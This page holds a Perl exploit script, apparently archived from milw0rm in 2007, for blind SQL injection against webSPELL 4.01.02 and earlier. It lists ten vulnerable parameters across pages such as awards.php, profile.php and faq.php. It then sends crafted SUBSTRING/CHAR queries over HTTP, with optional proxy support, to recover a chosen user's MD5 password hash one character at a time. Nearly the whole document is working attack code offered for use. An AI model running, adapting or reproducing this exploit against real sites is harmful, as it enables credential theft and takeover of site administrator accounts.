<html><head><title>webSPELL <= 4.01.02 Multiple Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use Getopt::Long;

if(!$ARGV[3])
{
  print &quot;\n                           \\#'#/                        &quot;;
  print &quot;\n                           (-.-)                         &quot;;
  print &quot;\n   -------------------oOO---(_)---OOo--------------------&quot;;
  print &quot;\n   | webSPELL &lt;= v4.01.02 Multiple Remote SQL Injection |&quot;;
  print &quot;\n   |                   coded by DNX                     |&quot;;
  print &quot;\n   ------------------------------------------------------&quot;;
  print &quot;\n[!] Solution: install security fix&quot;;
  print &quot;\n[!] Usage: perl ws.pl [Host] [Path] [Target] &lt;Options&gt;&quot;;
  print &quot;\n[!] Example: perl ws.pl 127.0.0.1 /webspell/ -0 -id 1&quot;;
  print &quot;\n[!] Targets:&quot;;
  print &quot;\n       -0            Bug in awards.php line 207, inject code in \$awardID&quot;;
  print &quot;\n       -1            Bug in clanwars_details.php line 36, inject code in \$cwID&quot;;
  print &quot;\n       -2            Bug in demos.php line 301, inject code in \$demoID&quot;;
  print &quot;\n       -3            Bug in profile.php line 37, inject code in \$id&quot;;
  print &quot;\n       -4            Bug in links.php line 139, inject code in \$linkcatID&quot;;
  print &quot;\n       -5            Bug in faq.php line 37, inject code in \$faqcatID&quot;;
  print &quot;\n       -6            Bug in faq.php line 72, inject code in \$faqID&quot;;
  print &quot;\n       -7            Bug in articles.php line 256, inject code in \$articlesID&quot;;
  print &quot;\n       -8            Bug in news_comments.php line 38, inject code in \$newsID&quot;;
  print &quot;\n       -9            Bug in cash_box.php line 119, inject code in \$id&quot;;
  print &quot;\n[!] Options:&quot;;
  print &quot;\n       -id [no]      Valid ID for \$awardID, \$cwID, \$demoID, \$newsID, ...&quot;;
  print &quot;\n       -uid [no]     User-ID, default is 1&quot;;
  print &quot;\n       -t [name]     Changed the user table name, default is webs_user&quot;;
  print &quot;\n       -p [ip:port]  Proxy support&quot;;
  print &quot;\n&quot;;
  exit;
}

my $host    = $ARGV[0];
my $path    = $ARGV[1];
my $user    = 1;
my $table   = &quot;webs_user&quot;;
my $id      = 0;
my %options = ();
GetOptions(\%options, &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;, &quot;id=i&quot;, &quot;uid=i&quot;, &quot;t=s&quot;, &quot;p=s&quot;);

print &quot;[!] Exploiting...\n&quot;;

if($options{&quot;id&quot;})
{
  $id = $options{&quot;id&quot;};
}
else
{
  print &quot;[!] Exploit failed, missing parameter\n&quot;;
  exit;
}

if($options{&quot;uid&quot;})
{
  $user = $options{&quot;uid&quot;};
}

if($options{&quot;t&quot;})
{
  $table = $options{&quot;t&quot;};
}

syswrite(STDOUT, &quot;[!] MD5-Hash: &quot;, 14);

for(my $i = 1; $i &lt;= 32; $i++)
{
  my $found = 0;
  my $h = 48;
  while(!$found &amp;&amp; $h &lt;= 57)
  {
    if(istrue3($host, $path, $table, $id, $user, $i, $h))
    {
      $found = 1;
      syswrite(STDOUT, chr($h), 1);
    }
    $h++;
  }
  if(!$found)
  {
    $h = 97;
    while(!$found &amp;&amp; $h &lt;= 122)
    {
      if(istrue3($host, $path, $table, $id, $user, $i, $h))
      {
        $found = 1;
        syswrite(STDOUT, chr($h), 1);
      }
      $h++;
    }
  }
}

print &quot;\n[!] Exploit done\n&quot;;

sub istrue3
{
  my $host   = shift;
  my $path   = shift;
  my $table  = shift;
  my $id     = shift;
  my $uid    = shift;
  my $i      = shift;
  my $h      = shift;
  my $url    = &quot;http://&quot;.$host.$path;
  my $regexp = &quot;&quot;;
  
  my $ua = LWP::UserAgent-&gt;new;
  
  if($options{&quot;0&quot;})
  {
    $url .= &quot;index.php?site=awards&amp;action=details&amp;awardID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;  
    $regexp = &quot;Event: -&quot;;
  }
  if($options{&quot;1&quot;})
  {
    $url .= &quot;index.php?site=clanwars_details&amp;cwID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;&lt;img src=\&quot;images\/games\/\.gif&quot;;
  }
  if($options{&quot;2&quot;})
  {
    $url .= &quot;index.php?site=demos&amp;action=showdemo&amp;demoID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;&lt;img src=\&quot;images\/games\/\.gif&quot;;
  }
  if($options{&quot;3&quot;})
  {
    $url .= &quot;index.php?site=profile&amp;action=buddys&amp;id=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no buddys&quot;;
  }
  if($options{&quot;4&quot;})
  {
    $url .= &quot;index.php?site=links&amp;action=show&amp;linkcatID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no links available&quot;;
  }
  if($options{&quot;5&quot;})
  {
    $url .= &quot;index.php?site=faq&amp;action=faqcat&amp;faqcatID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no faq available&quot;;
  }
  if($options{&quot;6&quot;})
  {
    $url .= &quot;index.php?site=faq&amp;action=faq&amp;faqID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no faq available&quot;;
  }
  if($options{&quot;7&quot;})
  {
    $url .= &quot;index.php?site=articles&amp;action=show&amp;articlesID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no entries&quot;;
  }
  if($options{&quot;8&quot;})
  {
    $url .= &quot;index.php?site=news_comments&amp;newsID=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;no version in selected language available&quot;;
  }
  if($options{&quot;9&quot;})
  {
    $url .= &quot;index.php?site=cash_box&amp;action=edit&amp;id=&quot;.$id.&quot;'%20AND%20SUBSTRING((SELECT%20password%20FROM%20&quot;.$table.&quot;%20WHERE%20userID=&quot;.$uid.&quot;),&quot;.$i.&quot;,1)=CHAR(&quot;.$h.&quot;)/*&quot;;
    $regexp = &quot;&lt;textarea name=\&quot;info\&quot; cols=\&quot;50\&quot; rows=\&quot;7\&quot;&gt;&lt;\/textarea&gt;&quot;;
  }
  
  if($options{&quot;p&quot;})
  {
    $ua-&gt;proxy('http', &quot;http://&quot;.$options{&quot;p&quot;});
  }
  
  my $response = $ua-&gt;get($url);
  my $content = $response-&gt;content;
  
  if($content !~ /$regexp/)
  {
    return 1;
  }
  else
  {
    return 0;
  }
}

# milw0rm.com [2007-03-02]</pre></html>